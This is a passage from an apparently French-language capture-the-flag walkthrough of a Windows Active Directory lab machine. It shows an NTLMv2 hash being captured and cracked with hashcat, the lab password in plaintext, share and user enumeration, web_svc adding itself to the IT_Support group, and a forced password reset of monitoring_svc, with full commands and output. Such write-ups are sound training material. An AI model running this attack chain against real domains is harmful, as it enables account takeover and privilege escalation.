+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.11.93
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : NANOCORP<span style="color:#ae81ff">\w</span>eb_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : web_svc::NANOCORP:8c2319b80be69c75:2CEC5022FB7FA0100030756D99A21F98:010100000000000080ED37A2FD6DDC01B8A778C400B3484E00000000020008004500410052004C0001001E00570049004E002D0046003400410056004C004F003400420052005000370004003400570049004E002D0046003400410056004C004F00340042005200500037002E004500410052004C002E004C004F00430041004C00030014004500410052004C002E004C004F00430041004C00050014004500410052004C002E004C004F00430041004C000700080080ED37A2FD6DDC0106000400020000000800300030000000000000000000000000200000A0912495769EE939AB4E8AC154F7DE18E5D4E880839219E9B6F5A2BD022580350A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
+</span></span></code></pre></div><p><strong>🎯 Informations Capturées :</strong></p>
+<ul>
+<li><strong>Client IP :</strong> 10.10.11.93 (DC01)</li>
+<li><strong>Utilisateur :</strong> <code>NANOCORP\web_svc</code></li>
+<li><strong>Hash Type :</strong> NTLMv2-SSP</li>
+<li><strong>Hash complet :</strong> (voir ci-dessus)</li>
+</ul>
+<p><strong>Sauvegarde du hash :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; web_svc.hash <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WEB_SVC::NANOCORP:8c2319b80be69c75:2cec5022fb7fa0100030756d99a21f98:010100000000000080ed37a2fd6ddc01b8a778c400b3484e00000000020008004500410052004c0001001e00570049004e002d0046003400410056004c004f003400420052005000370004003400570049004e002d0046003400410056004c004f00340042005200500037002e004500410052004c002e004c004f00430041004c00030014004500410052004c002e004c004f00430041004c00050014004500410052004c002e004c004f00430041004c000700080080ed37a2fd6ddc0106000400020000000800300030000000000000000000000000200000a0912495769ee939ab4e8ac154f7de18e5d4e880839219e9b6f5a2bd022580350a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><hr>
+<h2 id="4-cracking-du-hash">4️⃣ CRACKING DU HASH<a hidden class="anchor" aria-hidden="true" href="#4-cracking-du-hash">#</a></h2>
+<h3 id="-hashcat">🔨 Hashcat<a hidden class="anchor" aria-hidden="true" href="#-hashcat">#</a></h3>
+<p><strong>Identification du mode Hashcat :</strong></p>
+<ul>
+<li><strong>NTLMv2</strong> = Mode <code>5600</code></li>
+</ul>
+<p><strong>Commande de cracking :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> web_svc.hash /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></div><p><strong>Résultat (instantané - 1 seconde) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>hashcat (v7.1.2) starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hash.Mode........: 5600 (NetNTLMv2)
+</span></span><span style="display:flex;"><span>Hash.Target......: WEB_SVC::NANOCORP:8c2319b80be69c75:...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WEB_SVC::NANOCORP:8c2319b80be69c75:...:dksehdgh712!@#
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Time.Started.....: Mon Dec 15 20:04:26 2025, (0 secs)
+</span></span><span style="display:flex;"><span>Time.Estimated...: Mon Dec 15 20:04:26 2025, (0 secs)
+</span></span><span style="display:flex;"><span>Speed.#01........: 6640.6 kH/s
+</span></span><span style="display:flex;"><span>Progress.........: 1869824/14344385 (13.04%)
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 (100.00%) Digests
+</span></span></code></pre></div><p><strong>🔑 Credentials Obtenus :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Username: web_svc
+</span></span><span style="display:flex;"><span>Password: dksehdgh712!@#
+</span></span></code></pre></div><hr>
+<h2 id="5-énumération-avec-web_svc">5️⃣ ÉNUMÉRATION AVEC web_svc<a hidden class="anchor" aria-hidden="true" href="#5-énumération-avec-web_svc">#</a></h2>
+<h3 id="-test-daccès">🔍 Test d&rsquo;Accès<a hidden class="anchor" aria-hidden="true" href="#-test-daccès">#</a></h3>
+<p><strong>Vérification SMB :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.93 -u web_svc -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> --shares
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  [+] nanocorp.htb\web_svc:dksehdgh712!@#
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  [*] Enumerated shares
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  Share           Permissions  Remark
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  -----           -----------  ------
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  ADMIN$                       Remote Admin
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  C$                           Default share
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  IPC$            READ         Remote IPC
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  NETLOGON        READ         Logon server share
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  SYSVOL          READ         Logon server share
+</span></span></code></pre></div><p><strong>💡 Observation :</strong></p>
+<ul>
+<li>✅ Authentification réussie</li>
+<li>✅ Accès en lecture à IPC$, NETLOGON, SYSVOL (standard)</li>
+<li>❌ Pas d&rsquo;accès aux partages admin (ADMIN$, C$)</li>
+<li>❌ Pas de partages personnalisés intéressants</li>
+</ul>
+<h3 id="-énumération-des-utilisateurs">👥 Énumération des Utilisateurs<a hidden class="anchor" aria-hidden="true" href="#-énumération-des-utilisateurs">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.93 -u web_svc -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> --users
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  -Username-      -Last PW Set-        -BadPW-  -Description-
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  Administrator   2025-04-09 23:00:49  0        Built-in account for administering the computer/domain
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  Guest           &lt;never&gt;              0        Built-in account for guest access
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  krbtgt          2025-04-03 01:38:45  0        Key Distribution Center Service Account
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  web_svc         2025-04-09 22:59:38  0
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  monitoring_svc  2025-12-15 19:03:55  0
+</span></span><span style="display:flex;"><span>SMB  10.10.11.93  445  DC01  [*] Enumerated 5 local users: NANOCORP
+</span></span></code></pre></div><p><strong>🎯 Utilisateurs Identifiés :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Description</th>
+<th>Intérêt</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrator</td>
+<td>Compte admin domaine</td>
+<td>⭐⭐⭐ Cible finale</td>
+</tr>
+<tr>
+<td>Guest</td>
+<td>Compte invité (désactivé)</td>
+<td>❌ Pas utile</td>
+</tr>
+<tr>
+<td>krbtgt</td>
+<td>Service Kerberos</td>
+<td>⭐ Pour Golden Ticket (post-exploitation)</td>
+</tr>
+<tr>
+<td><strong>web_svc</strong></td>
+<td><strong>Notre compte actuel</strong></td>
+<td>✅ Compromis</td>
+</tr>
+<tr>
+<td><strong>monitoring_svc</strong></td>
+<td><strong>Compte de service</strong></td>
+<td>⭐⭐ Cible potentielle</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-énumération-des-groupes">👥 Énumération des Groupes<a hidden class="anchor" aria-hidden="true" href="#-énumération-des-groupes">#</a></h3>
+<p><strong>Via rpcclient :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;NANOCORP\web_svc%dksehdgh712!@#&#39;</span> 10.10.11.93
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>rpcclient <span style="color:#f92672">$&gt;</span> enumdomgroups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>group:[Enterprise Read<span style="color:#f92672">-</span>only Domain Controllers] rid:[<span style="color:#ae81ff">0x1f2</span>]
+</span></span><span style="display:flex;"><span>group:[Domain Admins] rid:[<span style="color:#ae81ff">0x200</span>]
+</span></span><span style="display:flex;"><span>group:[Domain Users] rid:[<span style="color:#ae81ff">0x201</span>]
+</span></span><span style="display:flex;"><span>group:[Domain Guests] rid:[<span style="color:#ae81ff">0x202</span>]
+</span></span><span style="display:flex;"><span>group:[Domain Computers] rid:[<span style="color:#ae81ff">0x203</span>]
+</span></span><span style="display:flex;"><span>group:[Domain Controllers] rid:[<span style="color:#ae81ff">0x204</span>]
+</span></span><span style="display:flex;"><span>group:[Schema Admins] rid:[<span style="color:#ae81ff">0x206</span>]
+</span></span><span style="display:flex;"><span>group:[Enterprise Admins] rid:[<span style="color:#ae81ff">0x207</span>]
+</span></span><span style="display:flex;"><span>group:[Group Policy Creator Owners] rid:[<span style="color:#ae81ff">0x208</span>]
+</span></span><span style="display:flex;"><span>group:[Read<span style="color:#f92672">-</span>only Domain Controllers] rid:[<span style="color:#ae81ff">0x209</span>]
+</span></span><span style="display:flex;"><span>group:[Cloneable Domain Controllers] rid:[<span style="color:#ae81ff">0x20a</span>]
+</span></span><span style="display:flex;"><span>group:[Protected Users] rid:[<span style="color:#ae81ff">0x20d</span>]
+</span></span><span style="display:flex;"><span>group:[Key Admins] rid:[<span style="color:#ae81ff">0x20e</span>]
+</span></span><span style="display:flex;"><span>group:[Enterprise Key Admins] rid:[<span style="color:#ae81ff">0x20f</span>]
+</span></span><span style="display:flex;"><span>group:[DnsUpdateProxy] rid:[<span style="color:#ae81ff">0x44e</span>]
+</span></span><span style="display:flex;"><span>group:[IT_Support] rid:[<span style="color:#ae81ff">0xc1e</span>]  <span style="color:#960050;background-color:#1e0010">⬅️</span> <span style="color:#960050;background-color:#1e0010">⭐</span> Groupe personnalisé <span style="color:#f92672">!</span>
+</span></span></code></pre></div><p><strong>💡 Découverte Critique :</strong> Groupe <strong>IT_Support</strong> (RID: 0xc1e = 3102 en décimal)</p>
+<p><strong>Vérification du RID de web_svc :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rpcclient $&gt; lookupnames web_svc
+</span></span><span style="display:flex;"><span>web_svc S-1-5-21-2261381271-1331810270-697239744-1103 (User: 1)
+</span></span></code></pre></div><p><strong>RID de web_svc :</strong> 1103 (0x44F en hexadécimal)</p>
+<hr>
+<h2 id="6-abus-du-groupe-it_support">6️⃣ ABUS DU GROUPE IT_SUPPORT<a hidden class="anchor" aria-hidden="true" href="#6-abus-du-groupe-it_support">#</a></h2>
+<h3 id="-hypothèse-dexploitation">🎓 Hypothèse d&rsquo;Exploitation<a hidden class="anchor" aria-hidden="true" href="#-hypothèse-dexploitation">#</a></h3>
+<p><strong>Raisonnement :</strong></p>
+<ol>
+<li>
+<p>Le groupe <strong>IT_Support</strong> existe (non standard)</p>
+</li>
+<li>
+<p>Les groupes de support IT ont souvent des permissions élevées :</p>
+<ul>
+<li>Réinitialisation de mots de passe</li>
+<li>Modification d&rsquo;attributs utilisateurs</li>
+<li>Accès aux comptes de service</li>
+</ul>
+</li>
+<li>
+<p><strong>Objectif :</strong> Vérifier si IT_Support a des permissions sur <code>monitoring_svc</code></p>
+</li>
+</ol>
+<h3 id="-énumération-des-permissions">🔍 Énumération des Permissions<a hidden class="anchor" aria-hidden="true" href="#-énumération-des-permissions">#</a></h3>
+<p><strong>Via bloodyAD (outil d&rsquo;abus AD) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u web_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  get writable
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=nanocorp,DC=htb
+</span></span><span style="display:flex;"><span>permission: WRITE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
+</span></span><span style="display:flex;"><span>permission: WRITE
+</span></span></code></pre></div><p><strong>🔍 Analyse :</strong></p>
+<ul>
+<li>web_svc peut modifier <strong>son propre objet</strong> (normal)</li>
+<li>web_svc peut modifier <strong>S-1-5-11</strong> (Authenticated Users - pas utile)</li>
+<li><strong>Aucune mention de monitoring_svc</strong> ← On ne voit pas les permissions tant qu&rsquo;on n&rsquo;est pas dans le groupe !</li>
+</ul>
+<h3 id="-ajout-au-groupe-it_support">🎯 Ajout au Groupe IT_Support<a hidden class="anchor" aria-hidden="true" href="#-ajout-au-groupe-it_support">#</a></h3>
+<p><strong>🎓 Pourquoi ajouter web_svc à IT_Support ?</strong></p>
+<p>Si web_svc a des permissions sur IT_Support (peut-être via Self-Membership ou une ACL mal configurée), il peut s&rsquo;ajouter lui-même au groupe !</p>
+<p><strong>Test via ldapmodify :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapmodify -x <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -D <span style="color:#e6db74">&#34;NANOCORP\\web_svc&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -w <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H ldap://10.10.11.93 <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">dn: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">changetype: modify
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">add: member
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">member: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>modifying entry &#34;CN=IT_Support,CN=Users,DC=nanocorp,DC=htb&#34;
+</span></span></code></pre></div><p><strong>✅ Succès ! Aucune erreur !</strong></p>
+<p><strong>Alternative avec bloodyAD (plus simple) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u web_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  add groupMember <span style="color:#e6db74">&#39;IT_Support&#39;</span> <span style="color:#e6db74">&#39;web_svc&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[+] web_svc added to IT_Support
+</span></span></code></pre></div><h3 id="-vérification-de-lajout">✅ Vérification de l&rsquo;Ajout<a hidden class="anchor" aria-hidden="true" href="#-vérification-de-lajout">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H ldap://10.10.11.93 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -D <span style="color:#e6db74">&#34;NANOCORP\\web_svc&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -w <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#34;CN=IT_Support,CN=Users,DC=nanocorp,DC=htb&#34;</span> member
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># IT_Support, Users, nanocorp.htb
+</span></span><span style="display:flex;"><span>dn: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
+</span></span><span style="display:flex;"><span>member: CN=web_svc,CN=Users,DC=nanocorp,DC=htb  ⭐
+</span></span></code></pre></div><p><strong>Via bloodyAD :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u web_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  get membership web_svc
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>distinguishedName: CN=Users,CN=Builtin,DC=nanocorp,DC=htb
+</span></span><span style="display:flex;"><span>objectSid: S-1-5-32-545
+</span></span><span style="display:flex;"><span>sAMAccountName: Users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN=Domain Users,CN=Users,DC=nanocorp,DC=htb
+</span></span><span style="display:flex;"><span>objectSid: S-1-5-21-2261381271-1331810270-697239744-513
+</span></span><span style="display:flex;"><span>sAMAccountName: Domain Users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb  ⭐⭐
+</span></span><span style="display:flex;"><span>objectSid: S-1-5-21-2261381271-1331810270-697239744-3102
+</span></span><span style="display:flex;"><span>sAMAccountName: IT_Support
+</span></span></code></pre></div><p><strong>🎉 Confirmation :</strong> web_svc est maintenant membre de <strong>IT_Support</strong> !</p>
+<hr>
+<h2 id="7-changement-de-mot-de-passe---monitoring_svc">7️⃣ CHANGEMENT DE MOT DE PASSE - monitoring_svc<a hidden class="anchor" aria-hidden="true" href="#7-changement-de-mot-de-passe---monitoring_svc">#</a></h2>
+<h3 id="-permissions-du-groupe-it_support">🎓 Permissions du Groupe IT_Support<a hidden class="anchor" aria-hidden="true" href="#-permissions-du-groupe-it_support">#</a></h3>
+<p><strong>Hypothèse :</strong> IT_Support a probablement la permission <strong>ForceChangePassword</strong> (ou <strong>GenericAll</strong>) sur <code>monitoring_svc</code>.</p>
+<p><strong>Test de changement de mot de passe via rpcclient :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;NANOCORP\web_svc%dksehdgh712!@#&#39;</span> 10.10.11.93
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rpcclient $&gt; setuserinfo2 monitoring_svc 23 &#39;M0nit0r!ngP@ss2025&#39;
+</span></span><span style="display:flex;"><span>rpcclient $&gt;
+</span></span></code></pre></div><p><strong>✅ Aucune erreur = Succès probable !</strong></p>
+<p><strong>💡 Note :</strong> <code>setuserinfo2</code> avec l&rsquo;attribut 23 = changement de mot de passe</p>
+<h3 id="-contraintes-de-complexité">🛡️ Contraintes de Complexité<a hidden class="anchor" aria-hidden="true" href="#-contraintes-de-complexité">#</a></h3>
+<p><strong>Première tentative (mot de passe trop simple) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u <span style="color:#e6db74">&#39;web_svc&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  set password monitoring_svc <span style="color:#e6db74">&#39;1234567890!&#39;</span>
+</span></span></code></pre></div><p><strong>Erreur :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msldap.commons.exceptions.LDAPModifyException: New password doesn&#39;t match the complexity:
+</span></span><span style="display:flex;"><span>The password must contains characters from three of the following categories:
+</span></span><span style="display:flex;"><span>Uppercase, Lowercase, Digits, Special, Unicode Alphabetic not included in Uppercase and Lowercase
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password can&#39;t be changed before -2 days, 23:58:49.348103 because of the minimum password age policy.
+</span></span></code></pre></div><p><strong>🎓 Analyse de l&rsquo;Erreur :</strong></p>
+<ol>
+<li>
+<p><strong>Complexité insuffisante :</strong></p>
+<ul>
+<li>Requis : 3 des 4 catégories (Majuscule, minuscule, chiffre, spécial)</li>
+<li><code>1234567890!</code> = Seulement chiffres + spécial (2/4)</li>
+</ul>
+</li>
+<li>
+<p><strong>Minimum Password Age :</strong></p>
+<ul>
+<li>Le mot de passe ne peut pas être changé avant ~3 jours</li>
+<li><strong>MAIS</strong> cette règle ne s&rsquo;applique que si le mot de passe a été récemment changé</li>
+<li>Avec <strong>ForceChangePassword</strong> permission, on peut bypasser ça</li>
+</ul>
+</li>
+</ol>
+<h3 id="-changement-réussi">✅ Changement Réussi<a hidden class="anchor" aria-hidden="true" href="#-changement-réussi">#</a></h3>
+<p><strong>Commande avec mot de passe conforme :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u <span style="color:#e6db74">&#39;web_svc&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;dksehdgh712!@#&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  set password monitoring_svc <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[+] Password changed successfully!
+</span></span></code></pre></div><p><strong>🔑 Nouveaux Credentials :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Username: monitoring_svc
+</span></span><span style="display:flex;"><span>Password: PassW0rd!2025
+</span></span></code></pre></div><hr>
+<h2 id="8-accès-distant---bypass-winrm-restrictions">8️⃣ ACCÈS DISTANT - BYPASS WINRM RESTRICTIONS<a hidden class="anchor" aria-hidden="true" href="#8-accès-distant---bypass-winrm-restrictions">#</a></h2>
+<h3 id="-problème--evil-winrm-bloqué">❌ Problème : Evil-WinRM Bloqué<a hidden class="anchor" aria-hidden="true" href="#-problème--evil-winrm-bloqué">#</a></h3>
